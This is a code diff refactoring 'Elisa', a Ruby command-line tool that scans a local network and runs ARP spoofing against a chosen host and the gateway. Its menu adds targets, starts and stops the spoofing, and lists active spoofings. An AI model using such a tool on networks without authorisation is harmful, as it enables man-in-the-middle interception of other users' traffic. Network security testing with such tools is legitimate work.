@@ -3,8 +3,7 @@
 #Elisa script
 #This beauty can scan the local network and perform ARP spoofing
 
-require 'packetgen/utils'
-require_relative 'scanner'
+require_relative 'elisa_core'
 
 def selectTarget(aliveIps)
     aliveIps.each { | ip |
@@ -24,65 +23,33 @@ def selectTarget(aliveIps)
             return aliveIps[opt-1]
         end
     else
-        puts "Invalid option\n"
+        puts "\nInvalid option\n"
         return nil
     end
     
-end
-
-def addTarget(spoofer, targetIp, gateway)
-    return puts "No target selected\n" if targetIp.nil?
-
-    spoofer.add(targetIp,gateway)
-    spoofer.add(gateway,targetIp)
-end
-
-def startSpoofing(spoofer)
-    spoofer.start_all
-end
-
-def checkActiveSpoofings(spoofer)
-    activeTargets = spoofer.active_targets
-
-    if activeTargets.empty?
-        puts "No active targets"
-    else
-        puts "Active targets:\n"
-        activeTargets.each { |activeTarget|
-            puts "#{activeTarget}\n"
-        }
-    end
-
-end
-
-def stopSpoofing(spoofer)
-    spoofer.stop_all
 end
 
 
 puts "-----------  Elisa  ------------\n"
 puts "Your wishes are my commands\n\n"
 
-spoofer = PacketGen::Utils::ARPSpoofer.new
-scanner = HostScanner.new
+core = ElisaCore.new
 
-scanner.printDeviceInfo
+core.printDeviceInfo
 
-gateway = scanner.gateway
-
-aliveIps = scanner.startScan
-targetIp = nil
+core.startScan
 
 option = -1
 while option != "0" do
-    puts "\nTarget selected: " + (targetIp.nil? ? "None\n" : "#{targetIp}\n")
+    puts "\nTarget selected: " + (core.targetIp.nil? ? "None\n" : "#{core.targetIp}\n")
 
     puts "\n----------- OPTIONS -----------\n"
     puts "1-Select a target from scanned IPs\n"
-    puts "2-Add target to ARP spoofer\n"
-    puts "3-Start ARP spoofing\n"
-    puts "4-Check active spoofings\n"
-    puts "5-Stop ARP spoofing\n"
+    puts "2-Scan again\n"
+    puts "3-Add target to ARP spoofer\n"
+    puts "4-Start ARP spoofing\n"
+    puts "5-Check active spoofings\n"
+    puts "6-Stop ARP spoofing\n"
     puts "0-Exit\n"
 
     option = gets
@@ -90,24 +57,34 @@ while option != "0" do
 
     case option
     when "0"
-        stopSpoofing(spoofer)
-        puts "See you!\n"
+        begin
+            core.stopSpoofing
+        rescue => exception
+            
+        end
+        puts "\nSee you!\n"
     when "1"
-        targetIp = selectTarget(aliveIps)
+        core.targetIp = selectTarget(core.getAliveIpsArray)
     when "2"
-        addTarget(spoofer, targetIp, gateway)
+        core.startScan
     when "3"
-        startSpoofing(spoofer)
-        puts "APR spoofing started!"
+        if core.targetIp.nil?
+            puts "\nFirst you must select a target\n"
+        else
+            core.addTarget
+            puts "\nTarget added!"
+        end
     when "4"
-        checkActiveSpoofings(spoofer)
+        core.startSpoofing
+        puts "\nAPR spoofing started!"
     when "5"
-        stopSpoofing(spoofer)
-        puts "APR spoofing stoped!"
+        core.checkActiveSpoofings
+    when "6"
+        core.stopSpoofing
+        puts "\nAPR spoofing stoped!"
     else
-        puts "Invalid option\n"
+        puts "\nInvalid option\n"
     end
-
 
 end
 
